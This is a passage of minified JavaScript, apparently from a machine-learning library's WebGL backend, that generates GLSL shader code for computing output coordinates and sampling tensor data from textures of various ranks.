        }(a)) : (l = function OV(n, t, e) {
            switch (n.length) {
            case 0:
                return p1();
            case 1:
                return function jV(n, t, e) {
                    return 1 === t[0] ? e ? "\n      int getOutputCoords() {\n        return int(resultUV.x * float(outTexShape[1]));\n      }\n    " : `\n      int getOutputCoords() {\n        return int(resultUV.x * ${t[1]}.0);\n      }\n    ` : 1 === t[1] ? e ? "\n      int getOutputCoords() {\n        return int(resultUV.y * float(outTexShape[0]));\n      }\n    " : `\n      int getOutputCoords() {\n        return int(resultUV.y * ${t[0]}.0);\n      }\n    ` : e ? "\n    int getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(outTexShape[0], outTexShape[1]));\n      return resTexRC.x * outTexShape[1] + resTexRC.y;\n    }\n  " : `\n    int getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${t[0]}, ${t[1]}));\n      return resTexRC.x * ${t[1]} + resTexRC.y;\n    }\n  `
                }(0, t, e);
            case 2:
                return function iF(n, t, e) {
                    return Rt(n, t) ? e ? "\n      ivec2 getOutputCoords() {\n        return ivec2(resultUV.yx * vec2(outTexShape[0], outTexShape[1]));\n      }\n    " : `\n      ivec2 getOutputCoords() {\n        return ivec2(resultUV.yx * vec2(${t[0]}, ${t[1]}));\n      }\n    ` : 1 === n[1] ? e ? "\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2(outTexShape[0], outTexShape[1]));\n        int index = resTexRC.x * outTexShape[1] + resTexRC.y;\n        return ivec2(index, 0);\n      }\n    " : `\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2(${t[0]}, ${t[1]}));\n        int index = resTexRC.x * ${t[1]} + resTexRC.y;\n        return ivec2(index, 0);\n      }\n    ` : 1 === n[0] ? e ? "\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2(outTexShape[0], outTexShape[1]));\n        int index = resTexRC.x * outTexShape[1] + resTexRC.y;\n        return ivec2(0, index);\n      }\n    " : `\n      ivec2 getOutputCoords() {\n        ivec2 resTexRC = ivec2(resultUV.yx *\n                               vec2(${t[0]}, ${t[1]}));\n        int index = resTexRC.x * ${t[1]} + resTexRC.y;\n        return ivec2(0, index);\n      }\n    ` : e ? "\n    ivec2 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(outTexShape[0], outTexShape[1]));\n      int index = resTexRC.x * outTexShape[1] + resTexRC.y;\n      int r = index / outShape[1];\n      int c = index - r * outShape[1];\n      return ivec2(r, c);\n    }\n  " : `\n    ivec2 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${t[0]}, ${t[1]}));\n      int index = resTexRC.x * ${t[1]} + resTexRC.y;\n      int r = index / ${n[1]};\n      int c = index - r * ${n[1]};\n      return ivec2(r, c);\n    }\n  `
                }(n, t, e);
            case 3:
                return function tF(n, t, e) {
                    if (e)
                        return `\n  ivec3 getOutputCoords() {\n    ivec2 resTexRC = ivec2(resultUV.yx *\n                           vec2(outTexShape[0], outTexShape[1]));\n    int index = resTexRC.x * outTexShape[1] + resTexRC.y;\n    ${Tl(["r", "c", "d"], n)}\n    return ivec3(r, c, d);\n  }\n`;
                    const s = vo(["r", "c", "d"], n);
                    return `\n    ivec3 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${t[0]}, ${t[1]}));\n      int index = resTexRC.x * ${t[1]} + resTexRC.y;\n      ${s}\n      return ivec3(r, c, d);\n    }\n  `
                }(n, t, e);
            case 4:
                return function nF(n, t, e) {
                    if (e)
                        return `\n    ivec4 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n        vec2(outTexShape[0], outTexShape[1]));\n      int index = resTexRC.x * outTexShape[1] + resTexRC.y;\n      ${Tl(["r", "c", "d", "d2"], n)}\n      return ivec4(r, c, d, d2);\n    }\n  `;
                    const s = vo(["r", "c", "d", "d2"], n);
                    return `\n    ivec4 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n        vec2(${t[0]}, ${t[1]}));\n      int index = resTexRC.x * ${t[1]} + resTexRC.y;\n      ${s}\n      return ivec4(r, c, d, d2);\n    }\n  `
                }(n, t, e);
            case 5:
                return function sF(n, t) {
                    const e = vo(["r", "c", "d", "d2", "d3"], n);
                    return `\n    ivec5 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx * vec2(${t[0]},\n                             ${t[1]}));\n\n      int index = resTexRC.x * ${t[1]} + resTexRC.y;\n\n      ${e}\n\n      ivec5 outShape = ivec5(r, c, d, d2, d3);\n      return outShape;\n    }\n  `
                }(n, t);
            case 6:
                return function oF(n, t) {
                    const e = vo(["r", "c", "d", "d2", "d3", "d4"], n);
                    return `\n    ivec6 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n        vec2(${t[0]}, ${t[1]}));\n      int index = resTexRC.x * ${t[1]} + resTexRC.y;\n\n      ${e}\n\n      ivec6 result = ivec6(r, c, d, d2, d3, d4);\n      return result;\n    }\n  `
                }(n, t);
            default:
                throw new Error(`${n.length}-D output sampling is not yet supported`)
            }
        }(t.logicalShape, i, e.enableShapeUniforms),
        u = function ZV(n) {
            return `\n    void setOutput(float val) {\n      ${n.output} = vec4(val, 0, 0, 0);\n    }\n  `
        }(a)),
        e.packedInputs && (d += QV),
        [d, c, u, o, l, r, e.userCode].join("\n")
    }
    function hr(n, t=!1) {
        const e = n.shapeInfo.logicalShape;
        switch (e.length) {
        case 0:
            return function cF(n, t) {
                const e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1);
                if (n.shapeInfo.isUniform)
                    return `float ${s}() {return ${e};}`;
                const [o,r] = n.shapeInfo.texShape;
                if (1 === o && 1 === r)
                    return `\n      float ${s}() {\n        return sampleTexture(${e}, halfCR);\n      }\n    `;
                const i = So(e);
                if (t)
                    return `\n    float ${s}() {\n      vec2 uv = uvFromFlat(${e}TexShape[0], ${e}TexShape[1], ${i});\n      return sampleTexture(${e}, uv);\n    }\n  `;
                const [a,c] = n.shapeInfo.texShape;
                return `\n    float ${s}() {\n      vec2 uv = uvFromFlat(${a}, ${c}, ${i});\n      return sampleTexture(${e}, uv);\n    }\n  `
            }(n, t);
        case 1:
            return function uF(n, t) {
                const e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1);
                if (n.shapeInfo.isUniform)
                    return `\n      float ${s}(int index) {\n        ${pr(n)}\n      }\n    `;
                const o = n.shapeInfo.texShape
                  , r = o[0]
                  , i = o[1];
                if (1 === i && 1 === r)
                    return `\n      float ${s}(int index) {\n        return sampleTexture(${e}, halfCR);\n      }\n    `;
                const a = So(e);
                return 1 === i ? t ? `\n      float ${s}(int index) {\n        vec2 uv = vec2(0.5, (float(index + ${a}) + 0.5) / float(${e}TexShape[0]));\n        return sampleTexture(${e}, uv);\n      }\n    ` : `\n      float ${s}(int index) {\n        vec2 uv = vec2(0.5, (float(index + ${a}) + 0.5) / ${r}.0);\n        return sampleTexture(${e}, uv);\n      }\n    ` : 1 === r ? t ? `\n      float ${s}(int index) {\n        vec2 uv = vec2((float(index + ${a}) + 0.5) / float(${e}TexShape[1]), 0.5);\n        return sampleTexture(${e}, uv);\n      }\n    ` : `\n      float ${s}(int index) {\n        vec2 uv = vec2((float(index + ${a}) + 0.5) / ${i}.0, 0.5);\n        return sampleTexture(${e}, uv);\n      }\n    ` : t ? `\n    float ${s}(int index) {\n      vec2 uv = uvFromFlat(${e}TexShape[0], ${e}TexShape[1], index + ${a});\n      return sampleTexture(${e}, uv);\n    }\n  ` : `\n    float ${s}(int index) {\n      vec2 uv = uvFromFlat(${r}, ${i}, index + ${a});\n      return sampleTexture(${e}, uv);\n    }\n  `
            }(n, t);
        case 2:
            return function hF(n, t) {
                const e = n.shapeInfo.logicalShape
                  , s = n.name
                  , o = "get" + s.charAt(0).toUpperCase() + s.slice(1)
                  , r = n.shapeInfo.texShape;
                if (null != r && Rt(e, r)) {
                    if (t)
                        return `\n      float ${o}(int row, int col) {\n        vec2 uv = (vec2(col, row) + halfCR) / vec2(${s}TexShape[1], ${s}TexShape[0]);\n        return sampleTexture(${s}, uv);\n      }\n    `;
                    const h = r[0];
                    return `\n    float ${o}(int row, int col) {\n      vec2 uv = (vec2(col, row) + halfCR) / vec2(${r[1]}.0, ${h}.0);\n      return sampleTexture(${s}, uv);\n    }\n  `
                }
                const {newShape: i, keptDims: a} = fs(e)
                  , c = i;
                if (c.length < e.length) {
                    const p = ["row", "col"];
                    return `\n      ${hr(fr(n, c), t)}\n      float ${o}(int row, int col) {\n        return ${o}(${mr(p, a)});\n      }\n    `
                }
                if (n.shapeInfo.isUniform)
                    return `\n      float ${o}(int row, int col) {\n        int index = round(dot(vec2(row, col), vec2(${e[1]}, 1)));\n        ${pr(n)}\n      }\n    `;
                const l = r[0]
                  , u = r[1]
                  , d = So(s);
                return 1 === u ? t ? `\n      float ${o}(int row, int col) {\n        float index = dot(vec3(row, col, ${d}), vec3(${s}Shape[1], 1, 1));\n        vec2 uv = vec2(0.5, (index + 0.5) / float(${s}TexShape[0]));\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n    float ${o}(int row, int col) {\n      float index = dot(vec3(row, col, ${d}), vec3(${e[1]}, 1, 1));\n      vec2 uv = vec2(0.5, (index + 0.5) / ${l}.0);\n      return sampleTexture(${s}, uv);\n    }\n  ` : 1 === l ? t ? `\n      float ${o}(int row, int col) {\n        float index = dot(vec3(row, col, ${d}), vec3(${s}Shape[1], 1, 1));\n        vec2 uv = vec2((index + 0.5) / float(${s}TexShape[1]), 0.5);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n    float ${o}(int row, int col) {\n      float index = dot(vec3(row, col, ${d}), vec3(${e[1]}, 1, 1));\n      vec2 uv = vec2((index + 0.5) / ${u}.0, 0.5);\n      return sampleTexture(${s}, uv);\n    }\n  ` : t ? `\n      float ${o}(int row, int col) {\n        // Explicitly use integer operations as dot() only works on floats.\n        int index = row * ${s}Shape[1] + col + ${d};\n        vec2 uv = uvFromFlat(${s}TexShape[0], ${s}TexShape[1], index);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n  float ${o}(int row, int col) {\n    // Explicitly use integer operations as dot() only works on floats.\n    int index = row * ${e[1]} + col + ${d};\n    vec2 uv = uvFromFlat(${l}, ${u}, index);\n    return sampleTexture(${s}, uv);\n  }\n`
            }(n, t);
        case 3:
            return function fF(n, t) {
                const e = n.shapeInfo.logicalShape
                  , s = n.name
                  , o = "get" + s.charAt(0).toUpperCase() + s.slice(1)
                  , r = e[1] * e[2]
                  , i = e[2]
                  , {newShape: a, keptDims: c} = fs(e)
                  , l = a;
                if (l.length < e.length) {
                    const g = ["row", "col", "depth"];
                    return `\n        ${hr(fr(n, l), t)}\n        float ${o}(int row, int col, int depth) {\n          return ${o}(${mr(g, c)});\n        }\n      `
                }
                if (n.shapeInfo.isUniform)
                    return `\n      float ${o}(int row, int col, int depth) {\n        int index = round(dot(vec3(row, col, depth),\n                          vec3(${r}, ${i}, 1)));\n        ${pr(n)}\n      }\n    `;
                const u = n.shapeInfo.texShape
                  , d = u[0]
                  , h = u[1]
                  , p = n.shapeInfo.flatOffset;
                if (h === r && null == p)
                    return t ? `\n      float ${o}(int row, int col, int depth) {\n        int stride1 = ${s}Shape[2];\n        float texR = float(row);\n        float texC = dot(vec2(col, depth), vec2(stride1, 1));\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2(${s}TexShape[1], ${s}TexShape[0]);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n        float ${o}(int row, int col, int depth) {\n          float texR = float(row);\n          float texC = dot(vec2(col, depth), vec2(${i}, 1));\n          vec2 uv = (vec2(texC, texR) + halfCR) /\n                     vec2(${h}.0, ${d}.0);\n          return sampleTexture(${s}, uv);\n        }\n      `;
                if (h === i && null == p)
                    return t ? `\n      float ${o}(int row, int col, int depth) {\n        float texR = dot(vec2(row, col), vec2(${s}Shape[1], 1));\n        float texC = float(depth);\n        vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${s}TexShape[1], ${s}TexShape[0]);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n    float ${o}(int row, int col, int depth) {\n      float texR = dot(vec2(row, col), vec2(${e[1]}, 1));\n      float texC = float(depth);\n      vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${h}.0, ${d}.0);\n      return sampleTexture(${s}, uv);\n    }\n  `;
                const f = So(s);
                return t ? `\n    float ${o}(int row, int col, int depth) {\n      // Explicitly use integer operations as dot() only works on floats.\n      int stride0 = ${s}Shape[1] * ${s}Shape[2];\n      int stride1 = ${s}Shape[2];\n      int index = row * stride0 + col * stride1 + depth + ${f};\n      vec2 uv = uvFromFlat(${s}TexShape[0], ${s}TexShape[1], index);\n      return sampleTexture(${s}, uv);\n    }\n    ` : `\n      float ${o}(int row, int col, int depth) {\n        // Explicitly use integer operations as dot() only works on floats.\n        int index = row * ${r} + col * ${i} + depth + ${f};\n        vec2 uv = uvFromFlat(${d}, ${h}, index);\n        return sampleTexture(${s}, uv);\n      }\n  `
            }(n, t);
        case 4:
            return function gF(n, t) {
                const e = n.shapeInfo.logicalShape
                  , s = n.name
                  , o = "get" + s.charAt(0).toUpperCase() + s.slice(1)
                  , r = e[3]
                  , i = e[2] * r
                  , a = e[1] * i
                  , {newShape: c, keptDims: l} = fs(e);
                if (c.length < e.length) {
                    const I = ["row", "col", "depth", "depth2"];
                    return `\n      ${hr(fr(n, c), t)}\n      float ${o}(int row, int col, int depth, int depth2) {\n        return ${o}(${mr(I, l)});\n      }\n    `
                }
                if (n.shapeInfo.isUniform)
                    return `\n      float ${o}(int row, int col, int depth, int depth2) {\n        int index = round(dot(vec4(row, col, depth, depth2),\n                          vec4(${a}, ${i}, ${r}, 1)));\n        ${pr(n)}\n      }\n    `;
                const u = n.shapeInfo.flatOffset
                  , d = n.shapeInfo.texShape
                  , h = d[0]
                  , p = d[1]
                  , f = `int stride2 = ${s}Shape[3];`
                  , m = `int stride1 = ${s}Shape[2] * stride2;`
                  , g = `int stride0 = ${s}Shape[1] * stride1;`;
                if (p === a && null == u)
                    return t ? `\n      float ${o}(int row, int col, int depth, int depth2) {\n        ${f}\n        ${m}\n        float texR = float(row);\n        float texC =\n            dot(vec3(col, depth, depth2),\n                vec3(stride1, stride2, 1));\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2(${s}TexShape[1], ${s}TexShape[0]);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n      float ${o}(int row, int col, int depth, int depth2) {\n        float texR = float(row);\n        float texC =\n            dot(vec3(col, depth, depth2),\n                vec3(${i}, ${r}, 1));\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2(${p}.0, ${h}.0);\n        return sampleTexture(${s}, uv);\n      }\n    `;
                if (p === r && null == u)
                    return t ? `\n      float ${o}(int row, int col, int depth, int depth2) {\n        float texR = dot(vec3(row, col, depth),\n                         vec3(${s}Shape[1] * ${s}Shape[2], ${s}Shape[2], 1));\n        float texC = float(depth2);\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                  vec2(${s}TexShape[1], ${s}TexShape[0]);\n        return sampleTexture(${s}, uv);\n      }\n    ` : `\n      float ${o}(int row, int col, int depth, int depth2) {\n        float texR = dot(vec3(row, col, depth),\n                         vec3(${e[1] * e[2]}, ${e[2]}, 1));\n        float texC = float(depth2);\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                  vec2(${p}.0, ${h}.0);\n        return sampleTexture(${s}, uv);\n      }\n    `;
                const b = So(s);
                return t ? `\n    float ${o}(int row, int col, int depth, int depth2) {\n      // Explicitly use integer operations as dot() only works on floats.\n      ${f}\n      ${m}\n      ${g}\n      int index = row * stride0 + col * stride1 +\n          depth * stride2 + depth2;\n      vec2 uv = uvFromFlat(${s}TexShape[0], ${s}TexShape[1], index + ${b});\n      return sampleTexture(${s}, uv);\n    }\n  ` : `\n    float ${o}(int row, int col, int depth, int depth2) {\n      // Explicitly use integer operations as dot() only works on floats.\n      int index = row * ${a} + col * ${i} +\n          depth * ${r} + depth2;\n      vec2 uv = uvFromFlat(${h}, ${p}, index + ${b});\n      return sampleTexture(${s}, uv);\n    }\n  `
            }(n, t);
        case 5:
            return function bF(n) {
                const t = n.shapeInfo.logicalShape
                  , e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1)
                  , o = t[4]
                  , r = t[3] * o
                  , i = t[2] * r
                  , a = t[1] * i
                  , {newShape: c, keptDims: l} = fs(t);
                if (c.length < t.length) {
                    const g = ["row", "col", "depth", "depth2", "depth3"];
                    return `\n      ${hr(fr(n, c))}\n      float ${s}(int row, int col, int depth, int depth2, int depth3) {\n        return ${s}(${mr(g, l)});\n      }\n    `
                }
                if (n.shapeInfo.isUniform)
                    return `\n      float ${s}(int row, int col, int depth, int depth2, int depth3) {\n        float index = dot(\n          vec4(row, col, depth, depth2),\n          vec4(${a}, ${i}, ${r}, ${o})) +\n          depth3;\n        ${pr(n)}\n      }\n    `;
                const u = n.shapeInfo.flatOffset
                  , d = n.shapeInfo.texShape
                  , h = d[0]
                  , p = d[1];
                if (p === a && null == u)
                    return `\n      float ${s}(int row, int col, int depth, int depth2, int depth3) {\n        int texR = row;\n        float texC = dot(vec4(col, depth, depth2, depth3),\n                         vec4(${i}, ${r}, ${o}, 1));\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2(${p}.0, ${h}.0);\n        return sampleTexture(${e}, uv);\n      }\n    `;
                if (p === o && null == u)
                    return `\n      float ${s}(int row, int col, int depth, int depth2, int depth3) {\n        float texR = dot(\n          vec4(row, col, depth, depth2),\n          vec4(${t[1] * t[2] * t[3]},\n               ${t[2] * t[3]}, ${t[3]}, 1));\n        int texC = depth3;\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                  vec2(${p}.0, ${h}.0);\n        return sampleTexture(${e}, uv);\n      }\n    `;
                const f = So(e);
                return `\n    float ${s}(int row, int col, int depth, int depth2, int depth3) {\n      // Explicitly use integer operations as dot() only works on floats.\n      int index = row * ${a} + col * ${i} + depth * ${r} +\n          depth2 * ${o} + depth3 + ${f};\n      vec2 uv = uvFromFlat(${h}, ${p}, index);\n      return sampleTexture(${e}, uv);\n    }\n  `
            }(n);
        case 6:
            return function xF(n) {
                const t = n.shapeInfo.logicalShape
                  , e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1)
                  , {newShape: o, keptDims: r} = fs(t);
                if (o.length < t.length) {
                    const b = ["row", "col", "depth", "depth2", "depth3", "depth4"];
                    return `\n      ${hr(fr(n, o))}\n      float ${s}(int row, int col, int depth,\n                    int depth2, int depth3, int depth4) {\n        return ${s}(${mr(b, r)});\n      }\n    `
                }
                const i = t[5]
                  , a = t[4] * i
                  , c = t[3] * a
                  , l = t[2] * c
                  , u = t[1] * l;
                if (n.shapeInfo.isUniform)
                    return `\n      float ${s}(int row, int col, int depth,\n                  int depth2, int depth3, int depth4) {\n        int index = round(dot(\n          vec4(row, col, depth, depth2),\n          vec4(${u}, ${l}, ${c}, ${a})) +\n          dot(\n            vec2(depth3, depth4),\n            vec2(${i}, 1)));\n        ${pr(n)}\n      }\n    `;
                const d = n.shapeInfo.flatOffset
                  , h = n.shapeInfo.texShape
                  , p = h[0]
                  , f = h[1];
                if (f === u && null == d)
                    return `\n      float ${s}(int row, int col, int depth,\n                    int depth2, int depth3, int depth4) {\n        int texR = row;\n        float texC = dot(vec4(col, depth, depth2, depth3),\n          vec4(${l}, ${c}, ${a}, ${i})) +\n               float(depth4);\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                   vec2(${f}.0, ${p}.0);\n        return sampleTexture(${e}, uv);\n      }\n    `;
                if (f === i && null == d)
                    return `\n      float ${s}(int row, int col, int depth,\n                    int depth2, int depth3, int depth4) {\n        float texR = dot(vec4(row, col, depth, depth2),\n          vec4(${t[1] * t[2] * t[3] * t[4]},\n               ${t[2] * t[3] * t[4]},\n               ${t[3] * t[4]},\n               ${t[4]})) + float(depth3);\n        int texC = depth4;\n        vec2 uv = (vec2(texC, texR) + halfCR) /\n                  vec2(${f}.0, ${p}.0);\n        return sampleTexture(${e}, uv);\n      }\n    `;
                const m = So(e);
                return `\n    float ${s}(int row, int col, int depth,\n                  int depth2, int depth3, int depth4) {\n      // Explicitly use integer operations as dot() only works on floats.\n      int index = row * ${u} + col * ${l} + depth * ${c} +\n          depth2 * ${a} + depth3 * ${i} + depth4 + ${m};\n      vec2 uv = uvFromFlat(${p}, ${f}, index);\n      return sampleTexture(${e}, uv);\n    }\n  `
            }(n);
        default:
            throw new Error(`${e.length}-D input sampling is not yet supported`)
        }
    }
    function h1(n, t) {
        switch (n.shapeInfo.logicalShape.length) {
        case 0:
            return function aF(n) {
                const t = n.name
                  , e = "get" + t.charAt(0).toUpperCase() + t.slice(1)
                  , s = De();
                return `\n    vec4 ${e}() {\n      return ${s.texture2D}(${t}, halfCR);\n    }\n  `
            }(n);
        case 1:
            return function lF(n, t) {
                const e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1)
                  , o = n.shapeInfo.texShape
                  , r = De();
                if (t)
                    return `\n    vec4 ${s}(int index) {\n      ivec2 packedTexShape = ivec2(ceil(float(${e}TexShape[0]) / 2.0), ceil(float(${e}TexShape[1]) / 2.0));\n      vec2 uv = packedUVfrom1D(\n        packedTexShape[0], packedTexShape[1], index);\n      return ${r.texture2D}(${e}, uv);\n    }\n  `;
                const i = [Math.ceil(o[0] / 2), Math.ceil(o[1] / 2)];
                return `\n    vec4 ${s}(int index) {\n      vec2 uv = packedUVfrom1D(\n        ${i[0]}, ${i[1]}, index);\n      return ${r.texture2D}(${e}, uv);\n    }\n  `
            }(n, t);
        case 2:
            return function dF(n, t) {
                const e = n.shapeInfo.logicalShape
                  , s = n.name
                  , o = "get" + s.charAt(0).toUpperCase() + s.slice(1)
                  , r = n.shapeInfo.texShape
                  , i = r[0]
                  , a = r[1]
                  , c = De();
                if (null != r && Rt(e, r))
                    return t ? `\n      vec4 ${o}(int row, int col) {\n        vec2 uv = (vec2(col, row) + halfCR) / vec2(${s}TexShape[1], ${s}TexShape[0]);\n\n        return ${c.texture2D}(${s}, uv);\n      }\n    ` : `\n      vec4 ${o}(int row, int col) {\n        vec2 uv = (vec2(col, row) + halfCR) / vec2(${a}.0, ${i}.0);\n\n        return ${c.texture2D}(${s}, uv);\n      }\n    `;
                if (t)
                    return `\n    vec4 ${o}(int row, int col) {\n      ivec2 packedTexShape = ivec2(ceil(float(${s}TexShape[0]) / 2.0), ceil(float(${s}TexShape[1]) / 2.0));\n      int valuesPerRow = int(ceil(float(${s}Shape[1]) / 2.0));\n      vec2 uv = packedUVfrom2D(valuesPerRow, packedTexShape[0], packedTexShape[1], row, col);\n      return ${c.texture2D}(${s}, uv);\n    }\n  `;
                const l = [Math.ceil(r[0] / 2), Math.ceil(r[1] / 2)]
                  , u = Math.ceil(e[1] / 2);
                return `\n    vec4 ${o}(int row, int col) {\n      vec2 uv = packedUVfrom2D(${u}, ${l[0]}, ${l[1]}, row, col);\n      return ${c.texture2D}(${s}, uv);\n    }\n  `
            }(n, t);
        case 3:
            return function pF(n, t) {
                const e = n.shapeInfo.logicalShape
                  , s = n.name
                  , o = "get" + s.charAt(0).toUpperCase() + s.slice(1)
                  , r = n.shapeInfo.texShape
                  , i = [Math.ceil(r[0] / 2), Math.ceil(r[1] / 2)];
                if (1 === e[0]) {
                    const p = [1, 2]
                      , m = ["b", "row", "col"];
                    return `\n        ${h1(fr(n, e.slice(1)), t)}\n        vec4 ${o}(int b, int row, int col) {\n          return ${o}(${mr(m, p)});\n        }\n      `
                }
                const a = De();
                if (t)
                    return `\n    vec4 ${o}(int b, int row, int col) {\n      ivec2 packedTexShape = ivec2(ceil(float(${s}TexShape[0]) / 2.0), ceil(float(${s}TexShape[1]) / 2.0));\n      int valuesPerRow = int(ceil(float(${s}Shape[2]) / 2.0));\n      int texelsInBatch = valuesPerRow * int(ceil(float(${s}Shape[1]) / 2.0));\n      vec2 uv = packedUVfrom3D(\n        packedTexShape[0], packedTexShape[1], texelsInBatch, valuesPerRow, b, row, col);\n      return ${a.texture2D}(${s}, uv);\n    }\n  `;
                const c = i[0]
                  , l = i[1]
                  , u = Math.ceil(e[2] / 2)
                  , d = u * Math.ceil(e[1] / 2);
                return `\n    vec4 ${o}(int b, int row, int col) {\n      vec2 uv = packedUVfrom3D(\n        ${c}, ${l}, ${d}, ${u}, b, row, col);\n      return ${a.texture2D}(${s}, uv);\n    }\n  `
            }(n, t);
        default:
            return function mF(n, t) {
                const e = n.name
                  , s = "get" + e.charAt(0).toUpperCase() + e.slice(1)
                  , o = De();
                if (t)
                    return `\n    vec4 ${s}(int b2, int b, int row, int col) {\n      int valuesPerRow = int(ceil(float(${e}Shape[3]) / 2.0));\n      int texelsInBatch = valuesPerRow * int(ceil(float(${e}Shape[2]) / 2.0));\n      int index = b * texelsInBatch + (row / 2) * valuesPerRow + (col / 2);\n      texelsInBatch *= ${e}Shape[1];\n      index = b2 * texelsInBatch + index;\n      ivec2 packedTexShape = ivec2(ceil(float(${e}TexShape[0]) / 2.0), ceil(float(${e}TexShape[1]) / 2.0));\n      int texR = index / packedTexShape[1];\n      int texC = index - texR * packedTexShape[1];\n      vec2 uv = (vec2(texC, texR) + halfCR) / vec2(packedTexShape[1], packedTexShape[0]); return ${o.texture2D}(${e}, uv);\n    }\n  `;
                const r = n.shapeInfo.logicalShape
                  , i = r.length
                  , a = n.shapeInfo.texShape
                  , c = [Math.ceil(a[0] / 2), Math.ceil(a[1] / 2)]
                  , l = c[0]
                  , u = c[1]
                  , d = Math.ceil(r[i - 1] / 2);
                let h = d * Math.ceil(r[i - 2] / 2)
                  , p = "int b, int row, int col"
                  , f = `b * ${h} + (row / 2) * ${d} + (col / 2)`;
                for (let m = 2; m < i - 1; m++)
                    p = `int b${m}, ` + p,
                    h *= r[i - m - 1],
                    f = `b${m} * ${h} + ` + f;
                return `\n    vec4 ${s}(${p}) {\n      int index = ${f};\n      int texR = index / ${u};\n      int texC = index - texR * ${u};\n      vec2 uv = (vec2(texC, texR) + halfCR) / vec2(${u}, ${l});\n      return ${o.texture2D}(${e}, uv);\n    }\n  `
            }(n, t)
        }
    }
    const _V = "\nvec2 uvFromFlat(int texNumR, int texNumC, int index) {\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\nvec2 packedUVfrom1D(int texNumR, int texNumC, int index) {\n  int texelIndex = index / 2;\n  int texR = texelIndex / texNumC;\n  int texC = texelIndex - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n"
      , UV = "\nvec2 packedUVfrom2D(int texelsInLogicalRow, int texNumR,\n  int texNumC, int row, int col) {\n  int texelIndex = (row / 2) * texelsInLogicalRow + (col / 2);\n  int texR = texelIndex / texNumC;\n  int texC = texelIndex - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n"
      , YV = "\nvec2 packedUVfrom3D(int texNumR, int texNumC,\n    int texelsInBatch, int texelsInLogicalRow, int b,\n    int row, int col) {\n  int index = b * texelsInBatch + (row / 2) * texelsInLogicalRow + (col / 2);\n  int texR = index / texNumC;\n  int texC = index - texR * texNumC;\n  return (vec2(texC, texR) + halfCR) / vec2(texNumC, texNumR);\n}\n"
      , QV = "\n  float getChannel(vec4 frag, vec2 innerDims) {\n    vec2 modCoord = mod(innerDims, 2.);\n    return modCoord.x == 0. ?\n      (modCoord.y == 0. ? frag.r : frag.g) :\n      (modCoord.y == 0. ? frag.b : frag.a);\n  }\n  float getChannel(vec4 frag, int dim) {\n    float modCoord = mod(float(dim), 2.);\n    return modCoord == 0. ? frag.r : frag.g;\n  }\n";
    function p1() {
        return "\n    int getOutputCoords() {\n      return 0;\n    }\n  "
    }
    function So(n) {
        return `offset${n}`
    }
    function pr(n) {
        const t = n.name
          , e = Z(n.shapeInfo.logicalShape);
        return e < 2 ? `return ${t};` : `\n    for (int i = 0; i < ${e}; i++) {\n      if (i == index) {\n        return ${t}[i];\n      }\n    }\n  `
    }
    function Wt(n) {
        if (n <= 1)
            return "int";
        if (2 === n)
            return "ivec2";
        if (3 === n)
            return "ivec3";
        if (4 === n)
            return "ivec4";
        if (5 === n)
            return "ivec5";
        if (6 === n)
            return "ivec6";
        throw Error(`GPU for rank ${n} is not yet supported`)
    }
    function Rp(n, t, e) {
        const {newShape: s, keptDims: o} = fs(t)
          , r = t.length
          , i = n && 3 === r && 1 === t[0]
          , a = i ? t.slice(1) : s
          , c = !n && r > 1 && !Rt(t, e) && s.length < r || i;
        return {
            useSqueezeShape: c,
            uniformShape: c ? a : t,
            keptDims: o
        }
    }
    function fr(n, t) {
        const e = JSON.parse(JSON.stringify(n));
        return e.shapeInfo.logicalShape = t,
        e
    }
    function mr(n, t) {
        return t.map((e=>n[e])).join(", ")
    }
    function wF(n, t, e, s) {
        const o = e.map(((u,d)=>{
            const h = {
                logicalShape: u.shape,
                texShape: u.isUniform ? null : u.texData.texShape,
                isUniform: u.isUniform,
                isPacked: !u.isUniform && u.texData.isPacked,
                flatOffset: null
            };
            return null != u.texData && null != u.texData.slice && u.texData.slice.flatOffset > 0 && (h.flatOffset = u.texData.slice.flatOffset),
            {
                name: t.variableNames[d],
                shapeInfo: h
            }
        }
        ))
          , r = o.map((u=>u.shapeInfo))
          , i = {
